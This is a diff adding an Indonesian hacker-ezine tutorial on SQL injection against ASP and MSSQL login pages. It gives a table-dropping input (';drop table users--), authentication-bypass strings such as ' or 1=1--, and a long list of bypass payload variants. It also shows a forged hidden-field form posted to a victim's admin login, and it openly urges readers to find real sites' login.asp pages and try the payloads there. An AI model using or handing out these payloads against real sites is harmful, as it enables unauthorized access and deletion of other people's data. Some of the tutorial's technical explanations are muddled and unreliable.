@@ -1,0 +1,121 @@
+                            *-----------------------------------------------------------*
+        	            |              DASAR-DASAR SQL INJECTION 1                  |
+                	    *-----------------------------------------------------------* 
+			    *  			 by : the_day  ;the_day@echo.or.id      *
+                            |   Greetz to echo staf : y3dips,moby,comex;SARAH    |
+                            *                          *
+                            *-----------------------------------------------------------*
+
+Sebelum membahas tentang sql injection pertama-tama saya akan menerangkan apa itu sql injection dan 
+kenapa bisa terjadi.
+Sebenernya SQL injection terjadi ketika attacker bisa meng insert beberapa SQL statement ke 'query' 
+dengan cara manipulasi data input ke applikasi tsb.  
+Diantara DB format seperti PHP + MySQL dan ASP + MSACCESS atau dengan MySql ,
+disini gw cuma akan membahas tentang ASP+MsSql yang udah dicoba pada IIS 5 dan 
+beberapa sql injection pada url.
+Biasa Sql Injection dilakukan pada login page pada asp seperti di :
+	admin\login.asp
+	login.asp
+Jadi yang akan menjadi target itu page tersebut ,
+sekarang kita mulai aja dengan dasar-dasar sql injection :d.
+Biasanya di sql statment 
+	select id, user_name, password from user
+maksudnya perintah diatas menghasilkan data id,user_name dan password pada table user.
+Bisanya pada login page dengan mengunakan statment result setnya sebagai berikut :
+select id, user_name,password from user where name = 'echo' and password='password'
+Pada IIS dan ASP apabila terdapat kesalahan sintax script akan diberi tau dan ditampilkan di browser
+Server: Msg 170, Level 15, State 1, Line 1 Line 1: Incorrect syntax near 'jopi' SQL atau "Structured Query Language" 
+seharusnya tidak menyentuh system calls. Tetapi tidak dengan MSSQL.
+Nah, ga tau kenapa karakter single quote 'breaks out' 
+dari delimiter nya SQL  Jadi kalau misal ada inputan 
+User: echo';drop table user--
+dan akibatnya akan fatal , dan artinya adalah kita menghapus table user dan akan kosong deh tuh loginya :D
+oh iya '--' merukapan mark nya MSSQL, jadi perintah selanjutnya ga di execute.
+Sekarang untuk lebih jelasnya kita secara langsung pada login script seperti
+input login + password. Nama field nya 'login' dan 'pass'. dan 
+SQL nya di asp: var sql = select * from users where username='"+login+"' and password='"+pass"'";
+coba kalau ada inputan: login: ';drop table users-- pass: chfn (*wink* negative)
+pasti ke drop tuh table users
+Aduh pada pusing ya , gini deh cara gampangnya adn kita lupakan yang diatas :P kita langsung praktek aja>
+Coba cari disitus-situs yang menggunakan asp dan MsSql sebagai DB nya, lalu cari login.asp atau
+admin\login.asp.
+Kalau udah dapet masukin nich variable sql nya
+user:admin 
+pass:' or 1=1--
+Ingat kita disini hanya coba-coba kali aja dba nya ga pinter :d
+atau :
+user:' or 1=1--
+admin:' or 1=1--
+Mas , ga bisa nich gimana ya ?
+Inget sekarang rata-rata para admin pada pinter semua , kita cari yg gombol aja deh untuk tes kalau ga lo bisa
+buat sendiri script dan tes karena gw udah coba buat sendiri dan berhasil tanpa melakukan paket filter 
+pada db nya . Untuk test apakah suatu page mempunyai vulnerable , gini caranya :
+Kalian pernh melihat pada halaman-halaman ASP,JSP,PHP dan CGI yang didalam addressnya :
+http://vivtim/index.asp?id=10
+Selain kita test dengan login page diatas tadi , kita test dalam melakukan sedikit tambahan
+pada addressnya seperti memasukan : test'1=1-- 
+menjadi http://victim/index.asp?id=test'1=1--
+Kita juga bisa juga melakukan xss dengan sql injection ini , coba download source HTML dari page target
+lalu kita tamhankan hidden field pada source tersebut sebagai contoh :
+	<FORM action=http://victim/admin/login.asp method=post>
+	<input type=hidden name=A value="test' or 1=1--">
+	</FORM>
+Apabila beruntung kita apabila membuka page tersebut tidak perlu memasukan password dan username.
+ingat script ini ditamhakna pd script yg sudah kalian download dr target .
+				
+				Variable ' or 1=1--
+Mungkin pada bertanya-tanya kenapa mengunakan variable 'or 1=1-- dan sangat penting.Lihat contoh
+pada sebuah web tertulis http://victim/index.asp?category=laptop
+Dalam url tesebut category adalah variable name dan komputer adalah masukan untuk variable name tsb .
+Kalau ditulis dalam script ASP maka akan menjadi :
+ 	v_cat = request("category")
+	sqlstr="SELECT * FROM product WHERE PCategory='" & v_cat & "'"
+	set rs=conn.execute(sqlstr)
+Data yang kita masukan seperti komputer akan masuk ke dalam v_cat variable dan pd sql statment menjadi
+	SELECT * FROM product WHERE PCategory='laptop'
+lalu apa hub dengan 'or 1=1---
+coba kalau kita ganti http://victim/index.asp?category=laptop menjadi
+	http://victim/index.asp?category=laptop'or 1=1--
+Kita lihat varible v_cat sekarang menjadi laptop'or 1=1-- lalu dalam SQL query nya menjadi
+	SELECT * FROM product WHERE PCategory='laptop' or 1=1--'
+artinya v_cat mendapatkan masukan berupa varibale laptop atau var 1=1(kosong) yang menyebabkan
+Sql Server menjadi bingung dan akan mengeksekusi Select * pada table tsb yang mengakibatkan
+kita bisa masuk kedalam db teserbut dan db tsb tdk berfungsi :d. Lalu tanda -- merupakan 
+mark dari sql untuk ignore semua perintah. Bisa dibayangkan kalau terjadi pada login page
+Kita bisa masuk kedalam login page tanpa password dan user name :d.
+Kemungkinan-kemungkinan variable lainya :
+	or 1=1--
+	" or 1=1--
+	or 1=1--
+	' or 'a'='a
+	" or "a"="a
+	') or ('a'='a
+	' or 0=0 --
+	" or 0=0 --
+	or 0=0 --
+	' or 0=0 #
+	" or 0=0 #
+	or 0=0 #
+	' or 'x'='x
+	" or "x"="x
+	') or ('x'='x
+	' or 1=1--
+	" or 1=1--
+	or 1=1--
+	' or a=a--
+	" or "a"="a
+	') or ('a'='a
+	") or ("a"="a
+	hi" or "a"="a
+	hi" or 1=1 --
+	hi' or 1=1 --
+	hi' or 'a'='a
+	hi') or ('a'='a
+	hi") or ("a"="a
+	
+Selain masuk kedalam page tersebut kita juga bisa memanfaatkannya untuk remote execution dengan sql Injection
+dan untuk artikel akan dimasukan dalam ezine 3 echo.or.id .Semoga artikel ini berguna .
+-----------------------------------------------------------------------------------------------------------------------
+Sumber Bacca : http://securityfocus.com/articles/SQLinjectionBasicTutorial.php
+	       http://www.securiteam.com/securityreviews
+                  
